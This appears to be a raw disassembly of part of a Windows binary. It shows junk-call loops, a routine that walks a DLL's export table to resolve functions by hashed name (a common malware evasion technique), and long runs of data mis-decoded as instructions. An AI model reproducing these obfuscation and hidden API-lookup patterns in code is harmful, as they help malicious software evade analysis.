  411b54:	sub    DWORD PTR ds:0x434637,0x4345e7
  411b5e:	call   0x404d31
  411b63:	movzx  ecx,WORD PTR ds:0x4346b7
  411b6a:	and    ecx,DWORD PTR ds:0x43468b
  411b70:	mov    DWORD PTR ds:0x4346b7,ecx
  411b76:	mov    DWORD PTR [ebp-0x14],eax
  411b79:	mov    DWORD PTR ds:0x43470f,0x13
  411b83:	cmp    DWORD PTR ds:0x43470f,0x0
  411b8a:	je     0x411bc6
  411b90:	cmp    DWORD PTR ds:0x43470f,0x22
  411b97:	jne    0x411bad
  411b9d:	push   0x434810
  411ba2:	push   0x4347b5
  411ba7:	call   DWORD PTR ds:0x4130e4
  411bad:	xor    eax,eax
  411baf:	or     eax,DWORD PTR ds:0x43470f
  411bb5:	dec    eax
  411bb6:	mov    ds:0x43470f,eax
  411bbb:	jmp    0x411b83
  411bc0:	add    DWORD PTR ds:0x4345eb,edx
  411bc6:	mov    eax,DWORD PTR [ebp-0x4]
  411bc9:	mov    DWORD PTR ds:0x4346cb,0x10
  411bd3:	cmp    DWORD PTR ds:0x4346cb,0x0
  411bda:	je     0x411c1c
  411be0:	cmp    DWORD PTR ds:0x4346cb,0x1b
  411be7:	jne    0x411c0a
  411bed:	push   DWORD PTR [ebp-0x20]
  411bf0:	push   0x4372
  411bf5:	push   0x4348d5
  411bfa:	push   0x4348e9
  411bff:	push   0x7ff3
  411c04:	call   DWORD PTR ds:0x4130e8
  411c0a:	mov    ecx,DWORD PTR ds:0x4346cb
  411c10:	dec    ecx
  411c11:	mov    DWORD PTR ds:0x4346cb,ecx
  411c17:	jmp    0x411bd3
  411c1c:	mov    ecx,DWORD PTR [ebp-0x14]
  411c1f:	xor    eax,esi
  411c21:	add    eax,ebx
  411c23:	cmp    ecx,eax
  411c25:	je     0x411e9b
  411c2b:	mov    eax,DWORD PTR [ebp-0x14]
  411c2e:	mov    eax,DWORD PTR [eax+0x18]
  411c31:	mov    DWORD PTR [ebp-0x20],eax
  411c34:	mov    eax,DWORD PTR [ebp-0x14]
  411c37:	mov    ecx,DWORD PTR [ebp+0x8]
  411c3a:	add    ecx,DWORD PTR [eax+0x20]
  411c3d:	mov    DWORD PTR [ebp-0x28],ecx
  411c40:	mov    eax,DWORD PTR [ebp-0x14]
  411c43:	mov    ecx,DWORD PTR [ebp+0x8]
  411c46:	add    ecx,DWORD PTR [eax+0x24]
  411c49:	mov    DWORD PTR [ebp-0x2c],ecx
  411c4c:	mov    eax,DWORD PTR [ebp-0x14]
  411c4f:	mov    ecx,DWORD PTR [ebp+0x8]
  411c52:	add    ecx,DWORD PTR [eax+0x1c]
  411c55:	xor    esi,esi
  411c57:	mov    DWORD PTR [ebp-0x14],ecx
  411c5a:	mov    eax,DWORD PTR [ebp-0x28]
  411c5d:	mov    ecx,DWORD PTR [ebp+0x8]
  411c60:	jmp    0x411e60
  411c65:	scas   al,BYTE PTR es:[edi]
  411c66:	repz push esi
  411c68:	add    dl,BYTE PTR [ebx-0x5d]
  411c6b:	push   0x73
  411c6d:	out    dx,eax
  411c6e:	sub    DWORD PTR [ecx+0x2f],esp
  411c71:	daa    
  411c72:	xchg   ebx,eax
  411c73:	xlat   BYTE PTR ds:[ebx]
  411c74:	adc    ebp,edx
  411c76:	push   esi
  411c77:	jle    0x411cf7
  411c79:	pop    ecx
  411c7a:	jg     0x411cfa
  411c7c:	jle    0x411c65
  411c7e:	adc    ebp,ebx
  411c80:	pop    edi
  411c81:	jmp    0x2a9a657
  411c86:	out    dx,eax
  411c87:	test   bh,al
  411c89:	fimul  WORD PTR [esi]
  411c8b:	push   0x9884f16e
  411c90:	shl    BYTE PTR [eax+0x2d],cl
  411c93:	xor    eax,0x7db34a32
  411c98:	inc    esi
  411c99:	(bad)  
  411c9a:	ss lock fwait
  411c9d:	test   BYTE PTR ds:[edx+0x64],ch
  411ca1:	push   0xffffffc4
  411ca3:	enter  0xf414,0xa4
  411ca7:	fs jns 0x411cb2
  411caa:	bound  ebx,QWORD PTR [ebp-0x536c2c06]
  411cb0:	movzx  ebx,WORD PTR [edi-0xf]
  411cb4:	scas   eax,DWORD PTR es:[edi]
  411cb5:	xor    edi,DWORD PTR [esi+0x2b]
  411cb8:	retf   0xacc3
  411cbb:	pop    esp
  411cbc:	push   0x6578efc1
  411cc1:	cmp    DWORD PTR [edx+0x31eb68b7],ecx
  411cc7:	mov    edi,0xbdc1354d
  411ccc:	ds ret 
  411cce:	push   esp
  411ccf:	in     eax,0xaa
  411cd1:	test   bh,0xda
  411cd4:	xchg   esp,eax
  411cd5:	sbb    al,0xce
  411cd7:	and    eax,0xd2483949
  411cdc:	jmp    0x58e451e8
  411ce1:	xor    eax,0xb26808ed
  411ce6:	mov    bl,0x5d
  411ce8:	(bad)  
  411ce9:	pop    eax
  411cea:	mov    BYTE PTR [eax],ah
  411cec:	cmp    edx,0x11
  411cef:	nop
  411cf0:	ins    BYTE PTR es:[edi],dx
  411cf1:	jne    0x411ce9
  411cf3:	pop    esi
  411cf4:	xchg   edx,eax
  411cf5:	add    al,0x22
  411cf7:	mov    dh,bh
  411cf9:	adc    BYTE PTR [esi+edx*4-0xd1c1e8a],bh
  411d00:	call   0x5cc3:0x99e98a6a
  411d07:	in     eax,dx
  411d08:	pmaddwd mm7,QWORD PTR [ebx+0x95efea8]
  411d0f:	dec    ebx
  411d10:	inc    eax
  411d11:	add    dl,BYTE PTR [edi-0x36386e58]
  411d17:	pop    eax
  411d18:	and    cl,BYTE PTR [ecx-0x7e26e7d0]
  411d1e:	jno    0x411cfc
  411d20:	aaa    
  411d21:	cmc    
  411d22:	push   edi
  411d23:	jno    0x411d7b
  411d25:	mov    ds:0x3554dfa3,eax
  411d2a:	jl     0x411da5
  411d2c:	mov    cl,0xd1
  411d2e:	repz jg 0x411cee
  411d31:	pop    edi
  411d32:	pop    edi
  411d33:	push   esp
  411d34:	push   eax
  411d35:	mov    al,0xc5
  411d37:	jmp    0xd314:0xb7e0fb0a
  411d3e:	pop    ecx
  411d3f:	sti    
  411d40:	and    ch,cl
  411d42:	pop    es
  411d43:	popf   
  411d44:	icebp  
  411d45:	lock mov edi,0x59619d1c
  411d4b:	inc    ebx
  411d4c:	cmp    al,0xf2
  411d4e:	jle    0x411d28
  411d50:	inc    edi
  411d51:	(bad)  
  411d53:	mov    al,ds:0x964360a3
  411d58:	mov    dh,0x82
  411d5a:	jbe    0x411dbd
  411d5c:	in     al,0x8d
  411d5e:	mov    esp,0xa93eaa61
  411d63:	sbb    eax,0xaf0af5d4
  411d68:	out    dx,al
  411d69:	loopne 0x411dc1
  411d6b:	fld    QWORD PTR [eax+0x1d32051f]
  411d71:	xlat   BYTE PTR ds:[ebx]
  411d72:	(bad)  
  411d73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d74:	jae    0x411cff
  411d76:	dec    edi
  411d77:	mov    edi,0x6fc30a0d
  411d7c:	or     al,0x46
  411d7e:	xor    al,0x5c
  411d80:	pusha  
  411d81:	(bad)  
  411d82:	lods   al,BYTE PTR ds:[esi]
  411d83:	lock jo 0x411d16
  411d86:	lock jne 0x411de8
  411d89:	xor    BYTE PTR [ecx-0x55],ch
  411d8c:	push   ss
  411d8d:	aaa    
  411d8e:	fstp   TBYTE PTR ds:[ecx]
  411d91:	inc    esp
  411d92:	inc    ecx
  411d93:	js     0x411dc5
  411d95:	xchg   edi,eax
  411d96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d97:	imul   esi,ebp,0x2e353430
  411d9d:	jbe    0x411dac
  411d9f:	in     al,0x9b
  411da1:	inc    ecx
  411da2:	test   BYTE PTR [ebx-0x7171271b],ch
  411da8:	xchg   esi,eax
  411da9:	pop    eax
  411daa:	xor    BYTE PTR [esi-0x23],dl
  411dad:	mov    cl,0xc1
  411daf:	repnz mov ah,0x64
  411db2:	in     eax,dx
  411db3:	fimul  DWORD PTR [ecx]
  411db5:	xchg   ebx,eax
  411db6:	or     dh,BYTE PTR [ebx]
  411db8:	cmp    dh,BYTE PTR [esi]
  411dba:	sahf   
  411dbb:	(bad)  
  411dbc:	push   0xda46365c
  411dc1:	(bad)  
  411dc2:	fimul  DWORD PTR [ebx]
  411dc4:	(bad)  
  411dc5:	out    dx,al
  411dc6:	loop   0x411e14
  411dc8:	jb     0x411d7c
  411dca:	or     BYTE PTR [esi-0x79],ah
  411dcd:	cmp    DWORD PTR [ecx+ecx*8],ebp
  411dd0:	mov    cl,BYTE PTR [ebx-0x3]
  411dd3:	xor    ah,BYTE PTR [ebp+0x73]
  411dd6:	push   ebp
  411dd7:	mov    eax,0x642f6968
  411ddc:	jmp    0x15773ede
  411de1:	(bad)  
  411de3:	mov    ebp,0x81540fc9
  411de8:	sbb    DWORD PTR [esi-0x54],esp
  411deb:	repz and ch,ch
  411dee:	xchg   ebx,eax
  411def:	scas   al,BYTE PTR es:[edi]
  411df0:	stc    
  411df1:	ss jno 0x411e72
  411df4:	scas   al,BYTE PTR es:[edi]
  411df5:	adc    DWORD PTR [ecx+0x1c],esp
  411df8:	out    dx,eax
  411df9:	mov    cl,0x39
  411dfb:	mov    WORD PTR [edx+esi*8-0x28],fs
  411dff:	je     0x411e43
  411e01:	sub    DWORD PTR [ebp+0x4416aa2e],0x2f
  411e08:	popf   
  411e09:	iret   
  411e0a:	mov    edi,0x2be0b3e
  411e0f:	dec    ebp
  411e10:	sbb    eax,0x4d0dff9c
  411e15:	adc    al,0xc0
  411e17:	pop    edx
  411e18:	lods   al,BYTE PTR ds:[esi]
  411e19:	js     0x411e2a
  411e1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e1c:	sub    ebx,esp
  411e1e:	push   esp
  411e1f:	ja     0x411ddc
  411e21:	or     eax,0xca0ce764
  411e26:	mov    DWORD PTR [ebx-0x2b],eax
  411e29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e2a:	xor    BYTE PTR [ecx],bl
  411e2c:	ret    0x166c
  411e2f:	mov    ebp,0xd4115009
  411e34:	mov    al,ds:0xcb1de10e
  411e39:	mov    edi,0xaddb08ec
  411e3e:	jg     0x411e5e
  411e40:	or     bl,bh
  411e42:	stos   DWORD PTR es:[edi],eax
  411e43:	jns    0x411dd3
  411e45:	pop    esi
  411e46:	outs   dx,BYTE PTR ds:[esi]
  411e47:	xor    eax,0x571ad251
  411e4c:	sbb    al,cl
  411e4e:	arpl   WORD PTR [eax-0x7d82d203],dx
  411e54:	mov    esi,0xdc9e6f6
  411e59:	call   0xf59bc1c1
  411e5e:	imul   DWORD PTR [ecx]
  411e60:	add    ecx,DWORD PTR [eax+edi*4]
  411e63:	lea    eax,[ebp-0x8]
  411e66:	mov    DWORD PTR [ebp-0x30],ecx
  411e69:	push   eax
  411e6a:	push   DWORD PTR [ebp-0x30]
  411e6d:	push   DWORD PTR [ebp+0xc]
  411e70:	call   0x402e72
  411e75:	mov    eax,DWORD PTR [ebp-0x4]
  411e78:	mov    ecx,DWORD PTR [ebp-0x8]
  411e7b:	xor    eax,0x7510851
  411e80:	add    eax,ebx
  411e82:	cmp    ecx,eax
  411e84:	jne    0x411ea7
  411e8a:	mov    eax,DWORD PTR [ebp-0x20]
  411e8d:	inc    edi
  411e8e:	cmp    edi,eax
  411e90:	jb     0x411a92
  411e96:	jmp    0x4122b7
  411e9b:	mov    eax,DWORD PTR [ebp-0x4]
  411e9e:	xor    eax,esi
  411ea0:	add    eax,ebx
  411ea2:	jmp    0x412c05
  411ea7:	mov    eax,DWORD PTR [ebp-0x2c]
  411eaa:	movzx  eax,WORD PTR [eax+edi*2]
  411eae:	jmp    0x4120ae
  411eb3:	retf   
  411eb4:	dec    ebp
  411eb5:	add    DWORD PTR [edi+0x6d757391],esi
  411ebb:	je     0x411ea0
  411ebd:	jge    0x411f08
  411ebf:	out    dx,al
  411ec0:	inc    edi
  411ec1:	retf   0x304d
  411ec4:	push   eax
  411ec5:	jle    0x411f45
  411ec7:	pop    ecx
  411ec8:	jg     0x411f48
  411eca:	jle    0x411f1d
  411ecc:	loop   0x411efc
  411ece:	mov    DWORD PTR [edi],eax
  411ed0:	xor    BYTE PTR [edi-0x2af65740],ch
  411ed6:	int3   
  411ed7:	lods   al,BYTE PTR cs:[esi]
  411ed9:	iret   
  411eda:	cmp    eax,DWORD PTR [eax]
  411edc:	addr16 addr16 pop eax
  411edf:	cli    
  411ee0:	retf   
  411ee1:	aaa    
  411ee2:	cmp    ebx,ecx
  411ee4:	sti    
  411ee5:	adc    esp,DWORD PTR [edx-0x2374c258]
  411eeb:	ret    0x5918
  411eee:	pop    edi
  411eef:	xchg   ecx,eax
  411ef0:	sahf   
  411ef1:	sbb    al,0x87
  411ef3:	ret    
  411ef4:	mov    ebx,0x2fd9bca0
  411ef9:	xlat   BYTE PTR ss:[ebx]
  411efb:	dec    edi
  411efc:	mov    cl,0x7f
  411efe:	ds mov bh,0xa3
  411f01:	mov    esi,0xc218cf50
  411f06:	dec    esi
  411f07:	push   0x2d
  411f09:	fidiv  DWORD PTR [edx+0x10]
  411f0c:	ds dec ebx
  411f0e:	inc    esp
  411f0f:	mov    cs,WORD PTR [edx-0x32]
  411f12:	in     eax,dx
  411f13:	lock data16 hlt 
  411f16:	or     esi,DWORD PTR [eax]
  411f18:	xor    BYTE PTR [ebp+0x0],al
  411f1b:	and    ah,0xfc
  411f1e:	xchg   edi,eax
  411f1f:	arpl   WORD PTR [ecx+0x18],bp
  411f22:	jmp    0xe75aa210
  411f27:	cmp    ch,BYTE PTR [esi-0x3f21203e]
  411f2d:	int    0x1e
  411f2f:	pop    esi
  411f30:	loop   0x411ed5
  411f32:	mov    esi,0x3a9fee90
  411f37:	lock push ecx
  411f39:	ss push ebx
  411f3b:	adc    eax,0x4b2e7381
  411f40:	jecxz  0x411f27
  411f42:	cld    
  411f43:	fdivr  QWORD PTR [edx+esi*2+0x2a]
  411f47:	xor    al,0x57
  411f49:	jle    0x411f4d
  411f4b:	test   eax,esp
  411f4d:	cld    
  411f4e:	inc    ecx
  411f4f:	cli    
  411f50:	push   es
  411f51:	fcom   DWORD PTR [ecx]
  411f53:	mov    ds:0x46d0c6e0,eax
  411f58:	aaa    
  411f59:	mov    eax,0x9c9c2d96
  411f5e:	jle    0x411f3c
  411f60:	cwde   
  411f61:	mov    esi,0x4800ab9f
  411f66:	stos   BYTE PTR es:[edi],al
  411f67:	pop    ebp
  411f68:	push   ebp
  411f69:	daa    
  411f6a:	pop    ecx
  411f6b:	pusha  
  411f6c:	push   ds
  411f6d:	jb     0x411f0c
  411f6f:	sbb    esp,esi
  411f71:	pop    esp
  411f72:	push   esp
  411f73:	test   eax,eax
  411f75:	(bad)  
  411f76:	hlt    
  411f77:	fisttp WORD PTR [edi+0x1432b786]
  411f7d:	aas    
  411f7e:	(bad)  
  411f80:	push   0xffffffed
  411f82:	mov    ebx,DWORD PTR [edx]
  411f84:	lock in al,0x28
  411f87:	shl    BYTE PTR [edx],0xe7
  411f8a:	sub    bh,ah
  411f8c:	mov    edi,0xea896d13
  411f91:	push   cs
  411f92:	out    dx,eax
  411f93:	xor    eax,0x846b8378
  411f98:	pop    ebx
  411f99:	add    ebp,DWORD PTR ds:0xb2597cde
  411f9f:	fldcw  WORD PTR [eax]
  411fa1:	xor    bh,BYTE PTR [ecx+0x28033598]
  411fa7:	mov    bl,0x9b
  411fa9:	push   ebp
  411faa:	cmp    al,0xcf
  411fac:	(bad)  
  411fad:	in     eax,dx
  411fae:	fwait
  411faf:	dec    esp
  411fb0:	mov    bl,bh
  411fb2:	mov    ah,ch
  411fb4:	out    dx,eax
  411fb5:	adc    eax,0x104439a1
  411fba:	xchg   edx,eax
  411fbb:	jp     0x411f76
  411fbd:	(bad)  
  411fbe:	outs   dx,BYTE PTR ds:[esi]
  411fbf:	in     al,0x72
  411fc1:	jbe    0x411fb1
  411fc3:	ins    BYTE PTR es:[edi],dx
  411fc4:	inc    edx
  411fc5:	sub    eax,0x651b5995
  411fca:	aam    0x69
  411fcc:	inc    esp
  411fcd:	pop    edx
  411fce:	(bad)  
  411fd0:	dec    edx
  411fd1:	adc    BYTE PTR ds:0xeb04fd35,0xe7
  411fd8:	dec    ebx
  411fd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fda:	cmp    bl,bh
  411fdc:	(bad)  
  411fdd:	(bad)  
  411fde:	mov    eax,0x65a38448
  411fe3:	lods   al,BYTE PTR ds:[esi]
  411fe4:	or     eax,0xfab6007d
  411fe9:	or     DWORD PTR [ebx],edx
  411feb:	sbb    bh,BYTE PTR [edi-0x2a01667d]
  411ff1:	and    al,0xed
  411ff3:	cwde   
  411ff4:	adc    DWORD PTR [esi+0x4b],0xffffff82
  411ff8:	aaa    
  411ff9:	fdivr  st(0),st
  411ffb:	fcom   QWORD PTR [edi]
  411ffd:	push   ecx
  411ffe:	add    ecx,DWORD PTR [ebp+eax*8+0x4d]
  412002:	test   DWORD PTR [edi+ecx*1+0x37],esp
  412006:	icebp  
  412007:	mov    dl,0x6c
  412009:	lock sub eax,0xfa834cd6
  41200f:	out    dx,al
  412010:	(bad)  
  412011:	(bad)  
  412012:	cmp    eax,0x43e43738
  412017:	dec    eax
  412018:	or     al,0x1c
  41201a:	clc    
  41201b:	leave  
  41201c:	add    DWORD PTR [ebx-0x65],ebp
  41201f:	mov    cl,0x24
  412021:	fcmovbe st,st(5)
  412023:	and    al,0xa9
  412025:	push   ds
  412026:	imul   ebp,DWORD PTR [ebp+0x60ffd9d7],0x11bdd9cc
  412030:	test   BYTE PTR [eax],0x50
  412033:	stos   DWORD PTR es:[edi],eax
  412034:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412035:	mov    WORD PTR [edi-0x49be6793],cs
  41203b:	loop   0x412005
  41203d:	daa    
  41203e:	sub    esi,DWORD PTR [ebp+0x45cdfb6d]
  412044:	ret    0xbeab
  412047:	dec    edi
  412048:	int3   
  412049:	adc    esi,DWORD PTR [ebp+edi*4-0x22]
  41204d:	in     eax,dx
  41204e:	push   0x73a80ef7
  412053:	int    0xa3
  412055:	pop    ebp
  412056:	fs ins DWORD PTR es:[edi],dx
  412058:	in     al,0xf3
  41205a:	sbb    DWORD PTR ds:0x8a7ec927,esi
  412060:	cdq    
  412061:	test   ch,dh
  412063:	stos   BYTE PTR es:[edi],al
  412064:	or     ebp,DWORD PTR [edx]
  412066:	and    ch,BYTE PTR [ecx+0x2a569a3d]
  41206c:	call   0x14a5a47
  412071:	repnz pop ebx
  412073:	mov    DWORD PTR [edi-0x60],edx
  412076:	test   BYTE PTR [eax],dl
  412078:	mov    dh,0xcb
  41207a:	call   0xeee5dceb
  41207f:	int    0xcd
  412081:	push   edx
  412082:	prefetch BYTE PTR [esi]
  412085:	dec    ecx
  412086:	loop   0x412055
  412088:	adc    bh,al
  41208a:	(bad)  
  41208c:	xchg   ebp,eax
  41208d:	mov    esp,0xe5aa82cf
  412092:	push   ecx
  412093:	xchg   esp,eax
  412094:	sub    BYTE PTR [edi],bl
  412096:	call   0xf312:0xe34b07e
  41209d:	and    BYTE PTR [edx+0x4c],cl
  4120a0:	icebp  
  4120a1:	jl     0x412062
  4120a3:	cmp    eax,0x53117666
  4120a8:	xchg   DWORD PTR [edi],esp
  4120aa:	pop    eax
  4120ab:	adc    edi,DWORD PTR [ebx+0x5e]
  4120ae:	mov    ecx,DWORD PTR [ebp-0x14]
  4120b1:	mov    eax,DWORD PTR [ecx+eax*4]
  4120b4:	jmp    0x4122b4
  4120b9:	cmp    DWORD PTR [ecx+ebx*4+0x69156508],esp
  4120c0:	jne    0x4120eb
  4120c2:	xchg   edx,eax
  4120c3:	mov    al,0xd4
  4120c5:	or     DWORD PTR [ebp+0x51],ebp
  4120c8:	inc    esp
  4120c9:	adc    edx,DWORD PTR [edx+0x7e]
  4120cc:	jle    0x412127
  4120ce:	jg     0x41214e
  4120d0:	jle    0x4120d4
  4120d2:	scas   al,BYTE PTR es:[edi]
  4120d3:	xchg   edi,eax
  4120d4:	call   0x2edc3093
  4120d9:	or     eax,0x494b0e98
  4120de:	mov    ah,0x78
  4120e0:	mov    ds:0xa6fdbf7e,al
  4120e5:	sub    BYTE PTR [edi+0x3d],ch
  4120e8:	mov    ecx,0x3a9f8a2b
  4120ed:	ins    BYTE PTR es:[edi],dx
  4120ee:	iret   
  4120ef:	lods   eax,DWORD PTR ds:[esi]
  4120f0:	inc    edx
  4120f1:	bound  esp,QWORD PTR [eax+esi*4]
  4120f4:	outs   dx,DWORD PTR ds:[esi]
  4120f5:	xchg   DWORD PTR [edx+0x2e],ecx
  4120f8:	mov    edi,0x482f5412
  4120fd:	xor    BYTE PTR [eax],bh
  4120ff:	mov    ?,WORD PTR [ebx+0x760cc3fb]
  412105:	(bad)  
  412107:	xor    dh,BYTE PTR [eax+0x57]
  41210a:	in     al,0x9b
  41210c:	jnp    0x4120ee
  41210e:	and    esi,DWORD PTR [eax+0x4a17c203]
  412114:	in     eax,0x85
  412116:	adc    edx,DWORD PTR [eax+ecx*4]
  412119:	xchg   ebp,eax
  41211a:	fisub  WORD PTR [ebx+0x25]
  41211d:	outs   dx,BYTE PTR ds:[esi]
  41211e:	pusha  
  41211f:	xchg   esp,eax
  412120:	es cdq 
  412122:	mov    DWORD PTR [esi],ecx
  412124:	mov    al,ds:0x3a52426e
  412129:	in     al,dx
  41212a:	cmp    BYTE PTR [edx],dl
  41212c:	push   esp
  41212d:	and    BYTE PTR [edx],ch
  41212f:	mov    BYTE PTR [ecx],0x72
  412132:	test   BYTE PTR [edx+0x7731af42],ch
  412138:	mov    bl,0x7c
  41213a:	popf   
  41213b:	mov    edx,0xeaf500d
  412140:	ret    
  412141:	fwait
  412142:	add    esp,DWORD PTR [ecx]
  412144:	xlat   BYTE PTR ds:[ebx]
  412145:	xlat   BYTE PTR ds:[ebx]
  412146:	and    ch,ah
  412148:	push   esp
  412149:	loope  0x412184
  41214b:	push   0xcbe7cfb2
  412150:	das    
  412151:	xor    BYTE PTR [esi-0x6c],ch
  412154:	inc    ecx
  412155:	fisubr WORD PTR [eax+ebx*2]
  412158:	add    al,0xcc
  41215a:	lahf   
  41215b:	pop    ds
  41215c:	stos   BYTE PTR es:[edi],al
  41215d:	ins    BYTE PTR es:[edi],dx
  41215e:	dec    ebx
  41215f:	scas   eax,DWORD PTR es:[edi]
  412160:	adc    ebx,0xba6a398b
  412166:	xchg   edi,eax
  412167:	std    
  412168:	into   
  412169:	jge    0x4121e9
  41216b:	mov    bh,0x14
  41216d:	mul    ch
  41216f:	out    dx,eax
  412170:	mov    bl,0x86
  412172:	clc    
  412173:	push   edx
  412174:	jne    0x4121c2
  412176:	repz bound esp,QWORD PTR [ecx+0x51]
  41217a:	shr    dh,1
  41217c:	repz retf 
  41217e:	out    0xe2,al
  412180:	repz adc eax,0xf6396f6e
  412186:	push   ecx
  412187:	add    cl,BYTE PTR [ecx]
  412189:	xor    eax,DWORD PTR [edi]
  41218b:	adc    BYTE PTR gs:[eax+0x30],bh
  41218f:	pop    ebx
  412190:	(bad)  
  412191:	iret   
  412192:	test   eax,0x9595b2e6
  412197:	cmp    esp,DWORD PTR [esi-0x465a0ad8]
  41219d:	rcl    DWORD PTR [edi+0x6332f24],cl
  4121a3:	sub    al,0x49
  4121a5:	pop    ss
  4121a6:	or     eax,0xee109810
  4121ab:	jle    0x412213
  4121ad:	inc    ebp
  4121ae:	loopne 0x4121ed
  4121b0:	test   BYTE PTR [ecx+0x1],bh
  4121b3:	or     ch,BYTE PTR [ecx]
  4121b5:	xchg   edi,eax
  4121b6:	pop    ds
  4121b7:	rcl    DWORD PTR [ebx-0x5e81d8ef],cl
  4121bd:	mov    ch,0x22
  4121bf:	dec    ebx
  4121c0:	pop    ds
  4121c1:	mov    esp,0xa8d72a49
  4121c6:	pop    ss
  4121c7:	aad    0xea
  4121c9:	test   DWORD PTR [eax],eax
  4121cb:	dec    ebx
  4121cc:	cwde   
  4121cd:	xor    DWORD PTR [esp+edx*1],edx
  4121d0:	scas   al,BYTE PTR es:[edi]
  4121d1:	xchg   bl,cl
  4121d3:	pop    ecx
  4121d4:	add    eax,0xdc51db90
  4121d9:	fwait
  4121da:	sbb    edi,DWORD PTR [esi+0x2fb0a228]
  4121e0:	in     al,0xcd
  4121e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121e3:	xor    al,0x70
  4121e5:	xchg   ecx,eax
  4121e6:	cmp    DWORD PTR [edi],esp
  4121e8:	jno    0x412259
  4121ea:	mov    BYTE PTR [edi+0x56],al
  4121ed:	xor    BYTE PTR ds:0xbbbc0a33,0x2e
  4121f4:	fmul   st(1),st
  4121f6:	(bad)  
  4121f7:	aaa    
  4121f8:	mov    al,ds:0x40ba0974
  4121fd:	pop    esi
  4121fe:	mov    eax,0x93becbbd
  412203:	mov    ebp,es
  412205:	sbb    DWORD PTR [eax-0x6c0cd9a0],edx
  41220b:	pop    ds
  41220c:	xor    DWORD PTR [edi-0x7d],esi
  41220f:	push   ebx
  412210:	pop    ebx
  412211:	fisttp QWORD PTR [edi-0x46]
  412214:	dec    esp
  412215:	inc    esp
  412216:	jns    0x412267
  412218:	in     al,0x1b
  41221a:	fidiv  DWORD PTR [esi+0x24]
  41221d:	or     esp,edi
  41221f:	test   al,0x9
  412221:	or     eax,0x6a1b8e77
  412226:	mov    DWORD PTR [ebx+edi*8+0x7d],0x66b0c44a
  41222e:	(bad)  [ebx]
  412230:	push   esp
  412231:	cmp    DWORD PTR [ebx+0x10],esi
  412234:	int3   
  412235:	dec    ebp
  412236:	das    
  412237:	dec    ebp
  412238:	pop    ss
  412239:	sub    eax,0x3b5ad154
  41223e:	adc    al,0x8b
  412240:	jp     0x412222
  412242:	ret    
  412243:	sahf   
  412244:	push   ecx
  412245:	push   esi
  412246:	in     eax,dx
  412247:	xor    al,0x2e
  412249:	(bad)  
  41224a:	scas   al,BYTE PTR es:[edi]
  41224b:	imul   esi,DWORD PTR ds:[esi+0x35],0x52c2b5af
  412253:	(bad)
  412258:	mov    cl,0x67
  41225a:	xor    al,0x52
  41225c:	and    edi,edx
  41225e:	shr    DWORD PTR [ecx-0x170cac94],cl
  412264:	xchg   ebp,eax
  412265:	ins    BYTE PTR es:[edi],dx
  412266:	jae    0x41225f
  412268:	fild   DWORD PTR [edi]
  41226a:	dec    ecx
  41226b:	(bad)  
  41226c:	aaa    
  41226d:	out    dx,al
  41226e:	and    ah,BYTE PTR [ebp-0x2655e3e1]
  412274:	push   ebp
  412275:	dec    edi
  412276:	out    0x27,eax
  412278:	repz jecxz 0x4122b3
  41227b:	inc    esi
  41227c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41227d:	das    
  41227e:	stos   DWORD PTR es:[edi],eax
  41227f:	push   0x62c3fc86
  412284:	jnp    0x41220e
  412286:	pop    edx
  412287:	cld    
  412288:	sub    bl,BYTE PTR [ecx+0x23da7a1b]
  41228e:	push   ds
  41228f:	jle    0x4122b7
  412291:	sbb    ah,BYTE PTR [ecx-0x483a6e0f]
  412297:	cs dec eax
  412299:	xchg   esp,eax
  41229a:	jns    0x412223
  41229c:	test   al,0x43
  41229e:	pop    ebp
  41229f:	adc    DWORD PTR [esi],ebx
  4122a1:	cli    
  4122a2:	pop    edi
  4122a3:	sub    BYTE PTR [ebx],ah
  4122a5:	imul   ebp,DWORD PTR ds:0x8d84a7c5,0xffffffc5
  4122ac:	pop    ecx
  4122ad:	mov    eax,DWORD PTR [esi]
  4122af:	jae    0x412328
  4122b1:	mov    dh,0x7b
  4122b3:	ja     0x41223e
  4122b5:	inc    ebp
  4122b6:	or     al,0x8b
  4122b8:	inc    ebp
  4122b9:	cld    
  4122ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4122bd:	xor    eax,0x7510851
  4122c2:	add    eax,ebx
  4122c4:	cmp    ecx,eax
  4122c6:	jne    0x4122d9
  4122cc:	mov    eax,DWORD PTR [ebp-0x4]
  4122cf:	xor    eax,0x7510851
  4122d4:	jmp    0x411ea0
  4122d9:	mov    eax,DWORD PTR [ebp+0xc]
  4122dc:	jmp    0x4124dc
  4122e1:	xchg   DWORD PTR [eax],esp
  4122e3:	aam    0x43
  4122e5:	jne    0x41235a
  4122e7:	xchg   ecx,eax
  4122e8:	in     al,dx
  4122e9:	sub    BYTE PTR [ebx-0x28afec13],ch
  4122ef:	aas    
  4122f0:	fidivr DWORD PTR [esi+0x5c]
  4122f3:	jle    0x412373
  4122f5:	pop    ecx
  4122f6:	jg     0x412376
  4122f8:	jle    0x41228f
  4122fa:	mov    ebx,0xc6c0dc2b
  4122ff:	pop    ecx
  412300:	xor    BYTE PTR [eax],0xa4
  412303:	jo     0x412333
  412305:	cmp    BYTE PTR [ecx],al
  412307:	sub    al,0x99
  412309:	jns    0x412360
  41230b:	xchg   esp,eax
  41230c:	cmp    eax,0x4a9024c7
  412311:	sbb    BYTE PTR [edx+0x74d62676],cl
  412317:	lods   eax,DWORD PTR ds:[esi]
  412318:	add    dh,ah
  41231a:	pusha  
  41231b:	fadd   DWORD PTR [edx]
  41231d:	daa    
  41231e:	sti    
  41231f:	mov    dh,0x42
  412321:	aad    0xc7
  412323:	and    DWORD PTR [eax-0x1ca8dec5],ecx
  412329:	into   
  41232a:	push   ebp
  41232b:	add    BYTE PTR [edi-0x6f],bh
  41232e:	ins    BYTE PTR es:[edi],dx
  41232f:	jmp    0x412312
  412331:	mov    eax,ds:0x300e3975
  412336:	jmp    0xc489629b
  41233b:	shl    DWORD PTR [ebp+0x1c],0x71
  41233f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412340:	push   esi
  412341:	xlat   BYTE PTR ds:[ebx]
  412342:	ret    0xfb00
